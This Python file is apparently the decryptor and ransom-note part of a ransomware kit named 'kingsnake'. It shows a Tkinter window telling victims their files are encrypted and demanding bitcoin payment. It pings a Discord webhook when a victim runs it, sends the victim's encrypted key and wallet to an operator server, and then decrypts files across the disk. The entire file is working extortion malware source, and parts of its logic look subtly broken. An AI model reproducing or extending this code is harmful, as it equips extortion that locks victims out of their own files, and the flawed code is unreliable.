from cryptography.fernet import Fernet
import os, platform, configparser, requests, getpass
import tkinter as tk
from tkinter import ttk

user = getpass.getuser()

#sorry but i gotta put this here
match platform.system():
    case "Windows":
        defaultdir = "C:/"
        ignoredirs = ["C:\Windows", 
                      "C:\Program Files", 
                      "C:\Program Files (x86)", 
                      "C:\ProgramData", 
                      "C:\$Recycle.Bin", 
                      "C:\System Volume Information", 
                      "C:\pagefile.sys"]
    case "Linux":
        defaultdir = "/"
        ignoredirs = ["/boot", 
                      "/sbin", 
                      "/bin", 
                      "/lib", 
                      "/lib64", 
                      "/etc", 
                      "/dev", 
                      "/usr/bin", 
                      "/usr/lib", 
                      "/usr/sbin", 
                      "/usr/lib64", 
                      "/usr/share", 
                      "/usr/libexec", 
                      "/proc", 
                      "/sys", 
                      "/run", 
                      "/var/lib", 
                      "/var/log", 
                      "/var/run", 
                      "/var/spool"]
    case "Darwin": #mac
        defaultdir = "/"
        ignoredirs = ["/System", 
                      "/Library", 
                      "/usr", 
                      "/bin", 
                      "/sbin", 
                      "/var", 
                      "/etc", 
                      "/private", 
                      "/dev", 
                      "/Volumes"]

config = configparser.ConfigParser()
match platform.system():
    case "Windows":
        config.read(os.path.join(os.environ["APPDATA"], "kingsnake", "config.ini"))
    case "Linux":
        config.read(os.path.join("/home", user, ".config", "kingsnake", "config.ini"))
    case "Darwin":
        config.read(os.path.join("/Users", user, "Library", "Preferences", "kingsnake", "config.ini"))

webhookbool = config["webhook"]["url"] != "false"

webhookurl = ""
webhooktype = ""

if webhookbool:
    webhookurl = config["webhook"]["url"]
    webhooktype = config["webhook"]["type"]
    if webhooktype == "discord":
        data = {"content" : "Victim ran decryptor program"}
        requests.post(webhookurl, json=data)

def decrypt(btcaddress):
    match platform.system():
        case "Windows":
            with open(os.path.join(os.environ["APPDATA"], "kingsnake", "encsym.key"), "rb") as f:
                encsymkey = f.read()
        case "Linux":
            with open(os.path.join("/home", user, ".config", "kingsnake", "encsym.key"), "rb") as f:
                encsymkey = f.read()
        case "Darwin": #mac
            with open(os.path.join("/Users", user, "Library", "Preferences", "kingsnake", "encsym.key"), "rb") as f:
                encsymkey = f.read()

    data = {
        "encsymkey" : encsymkey,
        "btc_address" : btcaddress,
        "ammount" : config["bitcoin"]["payment"]
    }
    r = requests.post(config["domain"]["address"] + "decrypt", json=data)
    
    if r.text != "Bitcoin transaction not detected!":
        crypt = Fernet(r.content)

        validpaths = []

        for root, dirs, files in os.walk(defaultdir):
            for dir in dirs:
                fullpath = os.path.join(root, dir)
                if not any(ignored in fullpath or not fullpath.startswith(ignored) for ignored in ignoredirs):
                    validpaths.append(fullpath)

        for path in validpaths:
            for root, dirs, files in os.walk(path):
                for file in files:
                    with open(os.path.join(root, file), "rb") as f:
                        copy = f.read()
                    with open(os.path.join(root, file), "wb") as f:
                        f.write(crypt.decrypt(copy))
        

class App: #used ai to convery pygubu cause i wanna use just base python librarys only
    def __init__(self, master):
        self.master = master
        self.master.configure(background="#303234")
        self.master.minsize(500, 500)
        self.master.maxsize(500, 500)
        self.master.geometry("500x500")
 
        # StringVars
        self.EncryptionText = tk.StringVar(value=(
            f'OOPS! Your files have been encrypted! You may be thinking, "OH MY GOD WHAT DO I DO??????" '
            f"but don't worry, you will be able to get your files decrypted in no time.\n"
            f"INSTRUCTIONS:\n"
            f"Sadly, to get your files back you will have to pay ${config["bitcoin"]["payment"]} in bitcoin.\n"
            f"You can make a bitcoin wallet anywhere, just do it from your phone because your browser is "
            f"encrypted, and cant be accessed. There is a bitcoin wallet address at the bottom of this "
            f"window, you should pay ${config["bitcoin"]["payment"]} in bitcoin to that address, put your bitcoin address in the "
            f"field below, and then click confirm payment. If the payment was recieved and confirmed, "
            f"your files will be decrypted!"
        ))
        self.SendAddress = tk.StringVar(value=f"Wallet to send to:\n{config["bitcoin"]["wallet"]}")
        self.UserWallet = tk.StringVar(value="enter your wallet here")
 
        self._build_ui()
 
    def _build_ui(self):
        self.RansomLabel = ttk.Label(
            self.master,
            background="#303234",
            font="TkHeadingFont",
            foreground="#ff0000",
            text="Your files have been encrypted!",
        )
        self.RansomLabel.pack(side="top")
 
        self.InstructionMessage = tk.Message(
            self.master,
            anchor="w",
            background="#b0b0b0",
            width=450,
            textvariable=self.EncryptionText,
        )
        self.InstructionMessage.pack(side="top", ipady=50, pady=10)
 
        self.frame1 = ttk.Frame(self.master, height=200, width=200)
        self.frame1.pack(side="bottom", expand=True)
 
        self.SendWallet = tk.Message(
            self.frame1,
            width=200,
            textvariable=self.SendAddress,
        )
        self.SendWallet.grid(row=0, column=0, rowspan=2, ipadx=20, pady=20)
 
        self.UserEntry = ttk.Entry(self.frame1, textvariable=self.UserWallet)
        self.UserEntry.grid(row=0, column=1)
 
        self.ConfirmPayment = ttk.Button(
            self.frame1,
            text="I have paid!",
            command=lambda: decrypt(self.UserWallet),
        )
        self.ConfirmPayment.grid(row=1, column=1)
 
    def on_confirm_payment(self):
        pass
 
    def run(self):
        self.master.mainloop()
 
 
if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    app.run()
